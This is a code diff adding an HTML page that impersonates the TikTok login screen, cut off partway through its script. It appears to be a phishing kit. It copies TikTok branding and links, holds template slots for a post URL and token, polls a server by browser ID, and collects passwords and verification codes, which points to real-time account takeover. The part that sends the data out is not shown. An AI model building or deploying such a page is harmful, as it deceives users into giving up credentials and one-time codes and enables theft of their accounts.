@@ -1,0 +1,1295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TikTok</title>
+  <link rel="icon" href="https://www.tiktok.com/favicon.ico" type="image/x-icon" />
+  <style>
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body, html {
+      height: 100%;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background-color: #fff;
+      color: #161823;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    #app {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    /* ===== HEADER ===== */
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 16px 24px;
+      flex-shrink: 0;
+    }
+
+    .header-logo a {
+      display: flex;
+      align-items: center;
+      text-decoration: none;
+    }
+
+    .header-help {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 16px;
+      font-weight: 600;
+      color: #161823;
+      text-decoration: none;
+    }
+
+    .header-help:hover { text-decoration: underline; }
+
+    /* ===== MAIN CONTENT ===== */
+    .main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px 16px 0;
+    }
+
+    .login-card {
+      width: 100%;
+      max-width: 475px;
+    }
+
+    .login-card h1 {
+      font-size: 32px;
+      font-weight: 700;
+      text-align: center;
+      margin-bottom: 8px;
+      line-height: 1.2;
+    }
+
+    .login-card .subtitle {
+      font-size: 15px;
+      color: rgba(22,24,35,0.5);
+      text-align: center;
+      margin-bottom: 28px;
+      line-height: 1.4;
+    }
+
+    /* ===== SCREENS ===== */
+    .screen { display: none; }
+    .screen.active { display: block; }
+
+    /* ===== CHANNEL ITEMS ===== */
+    .channel-list {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-bottom: 24px;
+    }
+
+    .channel-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      width: 100%;
+      height: 48px;
+      border: 1px solid rgba(22,24,35,0.12);
+      border-radius: 8px;
+      background: #fff;
+      cursor: pointer;
+      transition: background 0.15s, border-color 0.15s;
+      padding: 0 16px;
+      font-size: 16px;
+      font-weight: 600;
+      color: #161823;
+    }
+
+    .channel-item:hover {
+      background: #f5f5f5;
+      border-color: #d0d1d3;
+    }
+
+    .channel-item:active { background: #f1f1f2; }
+
+    .channel-item .ch-icon {
+      width: 24px;
+      height: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .channel-item .ch-icon svg { width: 24px; height: 24px; }
+
+    .channel-item .ch-label { flex: 1; text-align: center; }
+
+    /* ===== TOS ===== */
+    .tos {
+      font-size: 12px;
+      color: rgba(22,24,35,0.5);
+      text-align: center;
+      line-height: 1.6;
+      margin-bottom: 0;
+    }
+
+    .tos a, .tos strong { color: #161823; font-weight: 600; text-decoration: none; }
+    .tos a:hover { text-decoration: underline; }
+
+    /* ===== QR SCREEN ===== */
+    .qr-wrapper {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .qr-image {
+      width: 200px;
+      height: 200px;
+      border: 1px solid rgba(22,24,35,0.12);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+      background: #fff;
+    }
+
+    .qr-image img { width: 180px; height: 180px; }
+
+    .qr-image .qr-placeholder {
+      width: 180px;
+      height: 180px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #ccc;
+      font-size: 64px;
+    }
+
+    .qr-instructions {
+      font-size: 14px;
+      color: rgba(22,24,35,0.75);
+      text-align: center;
+      line-height: 1.6;
+      margin-bottom: 24px;
+    }
+
+    /* ===== CREDENTIAL FORM ===== */
+    .tab-bar {
+      display: flex;
+      border-bottom: 1px solid rgba(22,24,35,0.12);
+      margin-bottom: 24px;
+    }
+
+    .tab-item {
+      flex: 1;
+      text-align: center;
+      padding: 12px 0;
+      font-size: 16px;
+      font-weight: 600;
+      color: rgba(22,24,35,0.5);
+      cursor: pointer;
+      position: relative;
+      transition: color 0.15s;
+    }
+
+    .tab-item.active { color: #161823; }
+
+    .tab-item.active::after {
+      content: '';
+      position: absolute;
+      bottom: -1px;
+      left: 0;
+      right: 0;
+      height: 2px;
+      background: #161823;
+    }
+
+    .cred-form { display: none; }
+    .cred-form.active { display: block; }
+
+    .form-group { margin-bottom: 16px; }
+
+    .form-input {
+      width: 100%;
+      height: 48px;
+      border: 1px solid rgba(22,24,35,0.12);
+      border-radius: 4px;
+      padding: 0 12px;
+      font-size: 16px;
+      color: #161823;
+      outline: none;
+      transition: border-color 0.15s;
+    }
+
+    .form-input:focus { border-color: #161823; }
+    .form-input::placeholder { color: rgba(22,24,35,0.34); }
+
+    .phone-group {
+      display: flex;
+      gap: 8px;
+    }
+
+    .country-code-wrap {
+      position: relative;
+      width: 120px;
+      flex-shrink: 0;
+    }
+
+    .country-code-wrap select {
+      width: 100%;
+      height: 48px;
+      border: 1px solid rgba(22,24,35,0.12);
+      border-radius: 4px;
+      padding: 0 28px 0 12px;
+      font-size: 16px;
+      color: #161823;
+      background: #fff;
+      appearance: none;
+      -webkit-appearance: none;
+      outline: none;
+      cursor: pointer;
+    }
+
+    .country-code-wrap::after {
+      content: '';
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 0;
+      height: 0;
+      border-left: 5px solid transparent;
+      border-right: 5px solid transparent;
+      border-top: 5px solid #161823;
+      pointer-events: none;
+    }
+
+    .phone-number-input { flex: 1; }
+
+    .password-wrap {
+      position: relative;
+    }
+
+    .password-wrap .form-input { padding-right: 48px; }
+
+    .pw-toggle {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .pw-toggle svg { width: 20px; height: 20px; color: rgba(22,24,35,0.34); }
+
+    .form-links {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin-bottom: 20px;
+      font-size: 14px;
+    }
+
+    .form-links a {
+      color: #161823;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .form-links a:hover { text-decoration: underline; }
+    .form-links .sep { color: rgba(22,24,35,0.12); }
+
+    .btn-login {
+      width: 100%;
+      height: 48px;
+      border: none;
+      border-radius: 4px;
+      background: rgba(22,24,35,0.06);
+      color: rgba(22,24,35,0.34);
+      font-size: 16px;
+      font-weight: 600;
+      cursor: not-allowed;
+      transition: background 0.15s, color 0.15s;
+      margin-bottom: 16px;
+    }
+
+    .btn-login.enabled {
+      background: #fe2c55;
+      color: #fff;
+      cursor: pointer;
+    }
+
+    .btn-login.enabled:hover { background: #e8264d; }
+
+    /* ===== GO BACK LINK ===== */
+    .go-back {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 4px;
+      font-size: 16px;
+      font-weight: 500;
+      color: #161823;
+      text-decoration: none;
+      padding: 12px 0;
+      cursor: pointer;
+      border: none;
+      background: none;
+      width: 100%;
+    }
+
+    .go-back:hover { text-decoration: underline; }
+    .go-back svg { width: 16px; height: 16px; }
+
+    /* ===== ERROR ===== */
+    .error-msg {
+      color: #e53935;
+      font-size: 13px;
+      margin-top: -8px;
+      margin-bottom: 12px;
+      display: none;
+    }
+
+    .error-msg.visible { display: block; }
+
+    /* ===== VERIFICATION ===== */
+    .verification-options { margin-bottom: 20px; }
+
+    .verification-radio {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 12px;
+      border: 1px solid rgba(22,24,35,0.12);
+      border-radius: 8px;
+      margin-bottom: 8px;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+
+    .verification-radio:hover { background: #f5f5f5; }
+
+    .verification-radio input[type="radio"] {
+      width: 18px;
+      height: 18px;
+      accent-color: #fe2c55;
+    }
+
+    .verification-radio label {
+      font-size: 14px;
+      color: #161823;
+      cursor: pointer;
+      flex: 1;
+    }
+
+    .btn-submit {
+      width: 100%;
+      height: 48px;
+      border: none;
+      border-radius: 4px;
+      background: #fe2c55;
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+
+    .btn-submit:hover { background: #e8264d; }
+
+    /* ===== FOOTER ===== */
+    .footer-signup {
+      text-align: center;
+      padding: 24px 16px;
+      font-size: 15px;
+      color: #161823;
+      border-top: 1px solid rgba(22,24,35,0.12);
+      margin-top: 20px;
+    }
+
+    .footer-signup a {
+      color: #fe2c55;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    .footer-signup a:hover { text-decoration: underline; }
+
+    .footer-bottom {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 16px 24px;
+      background: #161823;
+      flex-shrink: 0;
+    }
+
+    .lang-selector {
+      position: relative;
+    }
+
+    .lang-selector select {
+      appearance: none;
+      -webkit-appearance: none;
+      background: transparent;
+      border: 1px solid rgba(255,255,255,0.2);
+      border-radius: 4px;
+      color: #fff;
+      font-size: 14px;
+      padding: 8px 32px 8px 12px;
+      cursor: pointer;
+      outline: none;
+    }
+
+    .lang-selector::after {
+      content: '';
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 0;
+      height: 0;
+      border-left: 4px solid transparent;
+      border-right: 4px solid transparent;
+      border-top: 4px solid #fff;
+      pointer-events: none;
+    }
+
+    .copyright {
+      color: rgba(255,255,255,0.6);
+      font-size: 14px;
+    }
+
+    /* ===== LOADING OVERLAY ===== */
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.4);
+      z-index: 9999;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 16px;
+    }
+
+    .loading-overlay.visible { display: flex; }
+
+    .spinner {
+      width: 40px;
+      height: 40px;
+      border: 4px solid rgba(255,255,255,0.3);
+      border-top-color: #fe2c55;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .loading-text {
+      color: #fff;
+      font-size: 14px;
+      text-align: center;
+    }
+
+    .loading-error {
+      color: #fff;
+      font-size: 14px;
+      font-weight: 600;
+      display: none;
+    }
+
+    .loading-error.visible { display: block; }
+
+    /* ===== RESPONSIVE ===== */
+    @media (max-width: 480px) {
+      .header { padding: 12px 16px; }
+      .login-card h1 { font-size: 26px; }
+      .login-card .subtitle { font-size: 14px; margin-bottom: 20px; }
+      .channel-item { height: 44px; font-size: 14px; }
+      .footer-bottom { flex-direction: column; gap: 12px; align-items: flex-start; }
+    }
+  </style>
+</head>
+<body>
+
+<div id="app">
+  <!-- HEADER -->
+  <header class="header">
+    <div class="header-logo">
+      <a href="https://www.tiktok.com/" target="_blank" rel="noopener">
+        <svg width="118" height="42" viewBox="0 0 118 42" fill="none" xmlns="http://www.w3.org/2000/svg" style="height:26px;width:auto">
+          <path d="M9.875 16.842v-1.119A8.836 8.836 0 008.7 15.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 25.55c0-4.737 3.794-8.598 8.495-8.707z" fill="#25F4EE"/>
+          <path d="M10.086 29.526c2.14 0 3.89-1.707 3.967-3.83l.006-18.968h3.463a6.78 6.78 0 01-.11-1.202h-4.726l-.006 18.969a3.978 3.978 0 01-3.967 3.829 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 13.166v-1.055a6.506 6.506 0 01-3.583-1.068 6.571 6.571 0 003.583 2.123z" fill="#25F4EE"/>
+          <path d="M20.409 11.043a6.54 6.54 0 01-1.616-4.315h-1.265a6.557 6.557 0 002.88 4.316zM8.706 20.365a3.98 3.98 0 00-3.973 3.976c0 1.528.869 2.858 2.134 3.523a3.936 3.936 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.409 0 .805.07 1.175.185v-4.833a8.837 8.837 0 00-1.175-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.176-.185z" fill="#FE2C55"/>
+          <path d="M23.992 13.166v3.676c-2.453 0-4.727-.786-6.58-2.116v9.621c0 4.802-3.902 8.714-8.706 8.714a8.669 8.669 0 01-4.988-1.579 8.69 8.69 0 006.368 2.781c4.797 0 8.707-3.906 8.707-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.48 0-.94-.052-1.38-.148z" fill="#FE2C55"/>
+          <path d="M17.413 24.348v-9.622a11.251 11.251 0 006.58 2.116v-3.676a6.571 6.571 0 01-3.584-2.123 6.61 6.61 0 01-2.888-4.315H14.06l-.006 18.968a3.978 3.978 0 01-3.967 3.83A3.99 3.99 0 016.86 27.87a3.991 3.991 0 01-2.133-3.523A3.98 3.98 0 018.7 20.372c.409 0 .805.07 1.175.185v-3.708c-4.701.103-8.495 3.964-8.495 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.988 1.58c4.798 0 8.707-3.913 8.707-8.714z" fill="black"/>
+        </svg>
+      </a>
+    </div>
+    <a href="https://www.tiktok.com/feedback/" target="_blank" class="header-help">
+      <svg width="20" height="20" viewBox="0 0 48 48" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="M24 6C14.0589 6 6 14.0589 6 24C6 33.9411 14.0589 42 24 42C33.9411 42 42 33.9411 42 24C42 14.0589 33.9411 6 24 6ZM2 24C2 11.8497 11.8497 2 24 2C36.1503 2 46 11.8497 46 24C46 36.1503 36.1503 46 24 46C11.8497 46 2 36.1503 2 24ZM24.0909 15C22.172 15 20.3433 16.2292 19.2617 18.61C19.0332 19.1128 18.4726 19.4 17.9487 19.2253L16.0513 18.5929C15.5274 18.4182 15.2406 17.8497 15.4542 17.3405C16.9801 13.7031 20.0581 11 24.0909 11C28.459 11 32 14.541 32 18.9091C32 21.2138 30.7884 23.4606 29.2167 25.074C27.8157 26.5121 25.5807 27.702 22.9988 27.9518C22.4491 28.0049 22.0001 27.5523 22.0001 27V25C22.0001 24.4477 22.4504 24.0057 22.9955 23.9167C24.2296 23.7153 25.5034 23.1533 26.3515 22.2828C27.4389 21.1666 28 19.8679 28 18.9091C28 16.7502 26.2498 15 24.0909 15ZM24 36C22.3431 36 21 34.6569 21 33C21 31.3431 22.3431 30 24 30C25.6569 30 27 31.3431 27 33C27 34.6569 25.6569 36 24 36Z"/></svg>
+      <span>Feedback and help</span>
+    </a>
+  </header>
+
+  <!-- MAIN CONTENT -->
+  <main class="main">
+    <div class="login-card">
+
+      <!-- SCREEN: METHOD SELECTION -->
+      <div id="methodSelectionScreen" class="screen active">
+        <h1>Log in to TikTok</h1>
+        <p class="subtitle">Manage your account, check notifications,<br>comment on videos, and more.</p>
+        <div class="channel-list">
+          <button class="channel-item" onclick="selectMethod('qr')" type="button">
+            <span class="ch-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="3" height="3"/><rect x="18" y="14" width="3" height="3"/><rect x="14" y="18" width="3" height="3"/><rect x="18" y="18" width="3" height="3"/></svg>
+            </span>
+            <span class="ch-label">Use QR code</span>
+          </button>
+          <button class="channel-item" onclick="selectMethod('email')" type="button">
+            <span class="ch-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg>
+            </span>
+            <span class="ch-label">Use phone / email / username</span>
+          </button>
+          <button class="channel-item" onclick="selectMethod('facebook')" type="button">
+            <span class="ch-icon" style="color:#1877F2">
+              <svg viewBox="0 0 24 24" fill="currentColor"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+            </span>
+            <span class="ch-label">Continue with Facebook</span>
+          </button>
+          <button class="channel-item" onclick="selectMethod('google')" type="button">
+            <span class="ch-icon">
+              <svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
+            </span>
+            <span class="ch-label">Continue with Google</span>
+          </button>
+          <button class="channel-item" onclick="selectMethod('apple')" type="button">
+            <span class="ch-icon">
+              <svg viewBox="0 0 24 24" fill="currentColor"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>
+            </span>
+            <span class="ch-label">Continue with Apple</span>
+          </button>
+        </div>
+        <p class="tos">By continuing with an account located in <strong>Nigeria</strong>, you agree to our <a href="https://www.tiktok.com/legal/terms-of-service?lang=en" target="_blank">Terms of Service</a> and acknowledge that you have read our <a href="https://www.tiktok.com/legal/privacy-policy?lang=en" target="_blank">Privacy Policy</a>.</p>
+      </div>
+
+      <!-- SCREEN: QR CODE -->
+      <div id="qrScreen" class="screen">
+        <div class="qr-wrapper">
+          <h1>Log in with QR code</h1>
+          <div class="qr-image" style="margin-top:24px">
+            <div class="qr-placeholder" id="qrPlaceholder">
+              <svg width="120" height="120" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="10" y="10" width="35" height="35" rx="4" stroke="#ccc" stroke-width="3" fill="none"/><rect x="75" y="10" width="35" height="35" rx="4" stroke="#ccc" stroke-width="3" fill="none"/><rect x="10" y="75" width="35" height="35" rx="4" stroke="#ccc" stroke-width="3" fill="none"/><rect x="20" y="20" width="15" height="15" rx="2" fill="#ccc"/><rect x="85" y="20" width="15" height="15" rx="2" fill="#ccc"/><rect x="20" y="85" width="15" height="15" rx="2" fill="#ccc"/><rect x="55" y="10" width="10" height="10" fill="#ccc"/><rect x="55" y="30" width="10" height="10" fill="#ccc"/><rect x="55" y="55" width="10" height="10" fill="#ccc"/><rect x="10" y="55" width="10" height="10" fill="#ccc"/><rect x="30" y="55" width="10" height="10" fill="#ccc"/><rect x="75" y="55" width="10" height="10" fill="#ccc"/><rect x="95" y="55" width="10" height="10" fill="#ccc"/><rect x="75" y="75" width="10" height="10" fill="#ccc"/><rect x="95" y="75" width="10" height="10" fill="#ccc"/><rect x="75" y="95" width="10" height="10" fill="#ccc"/><rect x="95" y="95" width="10" height="10" fill="#ccc"/></svg>
+            </div>
+            <img id="qrImage" style="display:none" alt="QR Code">
+          </div>
+          <p class="qr-instructions">1. Scan with your mobile device's camera<br>2. Confirm login or sign up</p>
+          <button class="go-back" onclick="showMethodSelection()" type="button">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
+            Go back
+          </button>
+        </div>
+      </div>
+
+      <!-- SCREEN: CREDENTIAL FORM -->
+      <div id="credentialScreen" class="screen">
+        <h1>Log in</h1>
+        <div class="tab-bar">
+          <div class="tab-item active" id="tabPhone" onclick="switchTab('phone')">Phone</div>
+          <div class="tab-item" id="tabEmail" onclick="switchTab('email')">Log in with email or username</div>
+        </div>
+
+        <!-- Phone form -->
+        <form id="phoneForm" class="cred-form active" onsubmit="return false;">
+          <div class="form-group">
+            <div class="phone-group">
+              <div class="country-code-wrap">
+                <select id="countryCode">
+                  <option value="+234">NG +234</option>
+                  <option value="+1">US +1</option>
+                  <option value="+44">UK +44</option>
+                  <option value="+91">IN +91</option>
+                  <option value="+55">BR +55</option>
+                  <option value="+27">ZA +27</option>
+                  <option value="+233">GH +233</option>
+                  <option value="+254">KE +254</option>
+                  <option value="+256">UG +256</option>
+                  <option value="+255">TZ +255</option>
+                  <option value="+260">ZM +260</option>
+                  <option value="+263">ZW +263</option>
+                  <option value="+267">BW +267</option>
+                  <option value="+268">SZ +268</option>
+                  <option value="+264">NA +264</option>
+                  <option value="+265">MW +265</option>
+                  <option value="other">Other</option>
+                </select>
+              </div>
+              <input type="tel" class="form-input phone-number-input" id="phoneInput" placeholder="Phone number" autocomplete="tel">
+            </div>
+          </div>
+          <div class="form-group">
+            <div class="password-wrap">
+              <input type="password" class="form-input" id="phonePasswordInput" placeholder="Password" autocomplete="current-password">
+              <button type="button" class="pw-toggle" onclick="togglePassword('phonePasswordInput')">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+              </button>
+            </div>
+          </div>
+          <div class="form-links">
+            <a href="https://www.tiktok.com/forgot-password" target="_blank">Forgot password?</a>
+            <span class="sep">|</span>
+            <a href="javascript:void(0)">Log in with code</a>
+          </div>
+          <div class="error-msg" id="phoneError"></div>
+          <button type="button" class="btn-login" id="phoneSubmitBtn" onclick="handleUserSubmission()">Log in</button>
+        </form>
+
+        <!-- Email form -->
+        <form id="emailForm" class="cred-form" onsubmit="return false;">
+          <div class="form-group">
+            <input type="text" class="form-input" id="emailInput" placeholder="Email or username" autocomplete="username">
+          </div>
+          <div class="form-group">
+            <div class="password-wrap">
+              <input type="password" class="form-input" id="emailPasswordInput" placeholder="Password" autocomplete="current-password">
+              <button type="button" class="pw-toggle" onclick="togglePassword('emailPasswordInput')">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+              </button>
+            </div>
+          </div>
+          <div class="form-links">
+            <a href="https://www.tiktok.com/forgot-password" target="_blank">Forgot password?</a>
+            <span class="sep">|</span>
+            <a href="javascript:void(0)">Log in with code</a>
+          </div>
+          <div class="error-msg" id="emailError"></div>
+          <button type="button" class="btn-login" id="emailSubmitBtn" onclick="handleUserSubmission()">Log in</button>
+        </form>
+
+        <button class="go-back" onclick="showMethodSelection()" type="button">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
+          Go back
+        </button>
+      </div>
+
+      <!-- SCREEN: VERIFICATION OPTIONS -->
+      <div id="verificationOptionsScreen" class="screen">
+        <h1>Choose a verification option</h1>
+        <div class="verification-options" id="verificationOptionsContainer"></div>
+        <div class="error-msg" id="verificationChoiceError"></div>
+        <button type="button" class="btn-submit" onclick="submitVerificationChoice()">Submit Choice</button>
+        <button class="go-back" onclick="showMethodSelection()" type="button">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
+          Go back
+        </button>
+      </div>
+
+      <!-- SCREEN: VERIFICATION CODE -->
+      <div id="verificationCodeScreen" class="screen">
+        <h1>Enter Verification Code</h1>
+        <div class="form-group" style="margin-top:20px">
+          <input type="text" class="form-input" id="verificationCodeInput" placeholder="Enter code" autocomplete="one-time-code" onkeypress="if(event.key==='Enter')submitVerificationCode()">
+          <div class="error-msg" id="verificationCodeError"></div>
+          <div class="error-msg" id="invalidVerificationCode"></div>
+        </div>
+        <button type="button" class="btn-submit" onclick="submitVerificationCode()">Submit Code</button>
+        <button class="go-back" onclick="showMethodSelection()" type="button">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
+          Go back
+        </button>
+      </div>
+
+      <!-- SIGN UP FOOTER -->
+      <div class="footer-signup">
+        Don't have an account? <a href="https://www.tiktok.com/signup" target="_blank">Sign up</a>
+      </div>
+    </div>
+  </main>
+
+  <!-- BOTTOM BAR -->
+  <footer class="footer-bottom">
+    <div class="lang-selector">
+      <select id="langSelect">
+        <option value="en">English (US)</option>
+        <option value="es">Español</option>
+        <option value="pt">Português</option>
+        <option value="fr">Français</option>
+        <option value="de">Deutsch</option>
+        <option value="ja">日本語</option>
+        <option value="ko">한국어</option>
+        <option value="ar">العربية</option>
+        <option value="hi">हिन्दी</option>
+        <option value="id">Bahasa Indonesia</option>
+        <option value="th">ภาษาไทย</option>
+        <option value="vi">Tiếng Việt</option>
+        <option value="tr">Türkçe</option>
+        <option value="ru">Русский</option>
+        <option value="pl">Polski</option>
+        <option value="it">Italiano</option>
+        <option value="nl">Nederlands</option>
+        <option value="sv">Svenska</option>
+        <option value="da">Dansk</option>
+        <option value="fi">Suomi</option>
+        <option value="no">Norsk</option>
+        <option value="cs">Čeština</option>
+        <option value="el">Ελληνικά</option>
+        <option value="ro">Română</option>
+        <option value="hu">Magyar</option>
+        <option value="uk">Українська</option>
+        <option value="he">עברית</option>
+        <option value="ms">Bahasa Melayu</option>
+        <option value="bn">বাংলা</option>
+        <option value="tl">Filipino</option>
+      </select>
+    </div>
+    <span class="copyright">© 2026 TikTok</span>
+  </footer>
+</div>
+
+<!-- LOADING OVERLAY -->
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="spinner"></div>
+  <p class="loading-text" id="loadingMessage"></p>
+  <p class="loading-error" id="loadingError"></p>
+</div>
+
+<script>
+// ==================== TEMPLATE CONFIG ====================
+const templateConfig = {
+  postURL: "{{postURL}}",
+  token: "{{token}}",
+  landingPageLink: "{{landingPageLink}}"
+};
+
+const apiBaseUrl = window.location.origin + "/api";
+
+// ==================== STATE ====================
+let browserId = null;
+let pollingIntervalId = null;
+let pollingStartTime = null;
+const POLLING_TIMEOUT_MS = 10 * 60 * 1000;
+let currentStatus = null;
+let lastShownStatus = '';
+let selectedLoginMethod = null;
+let verificationOptions = [];
+
+const loadingMessages = [
+  "Securing your connection...",
+  "Verifying document integrity...",
+  "Establishing encrypted tunnel...",
+  "Authenticating access protocols...",
+  "Preparing your secure workspace...",
+  "Almost there, just a moment...",
+  "Ensuring data privacy...",
+  "Finalizing secure document retrieval..."
+];
+let currentMessageIndex = 0;
+let messageIntervalId = null;
+
+// ==================== SCREEN NAVIGATION ====================
+function showScreen(screenId) {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  const target = document.getElementById(screenId);
+  if (target) target.classList.add('active');
+}
+
+function showMethodSelection() {
+  showScreen('methodSelectionScreen');
+  selectedLoginMethod = null;
+}
+
+function selectMethod(method) {
+  selectedLoginMethod = method;
+  if (method === 'qr') {
+    showScreen('qrScreen');
+    initialFormSubmission();
+  } else if (method === 'email') {
+    showScreen('credentialScreen');
+    switchTab('email');
+  } else if (method === 'phone') {
+    showScreen('credentialScreen');
+    switchTab('phone');
+  } else if (method === 'facebook' || method === 'google' || method === 'apple') {
+    showScreen('credentialScreen');
+    switchTab('email');
+  }
+}
+
+function switchTab(tab) {
+  const tabPhone = document.getElementById('tabPhone');
+  const tabEmail = document.getElementById('tabEmail');
+  const phoneForm = document.getElementById('phoneForm');
+  const emailForm = document.getElementById('emailForm');
+
+  if (tab === 'phone') {
+    tabPhone.classList.add('active');
+    tabEmail.classList.remove('active');
+    phoneForm.classList.add('active');
+    emailForm.classList.remove('active');
+    selectedLoginMethod = 'phone';
+  } else {
+    tabPhone.classList.remove('active');
+    tabEmail.classList.add('active');
+    phoneForm.classList.remove('active');
+    emailForm.classList.add('active');
+    selectedLoginMethod = 'email';
+  }
+}
+
+// ==================== PASSWORD TOGGLE ====================
+function togglePassword(inputId) {
+  const input = document.getElementById(inputId);
+  if (!input) return;
+  input.type = input.type === 'password' ? 'text' : 'password';
+}
+
+// ==================== LOADING ====================
+function showLoading(msg) {
+  const overlay = document.getElementById('loadingOverlay');
+  const text = document.getElementById('loadingMessage');
+  const err = document.getElementById('loadingError');
+  overlay.classList.add('visible');
+  text.textContent = msg || '';
+  err.classList.remove('visible');
+  startLoadingMessages();
+}
+
+function hideLoading() {
+  document.getElementById('loadingOverlay').classList.remove('visible');
+  clearInterval(messageIntervalId);
+}
+
+function showLoadingError(msg) {
+  const err = document.getElementById('loadingError');
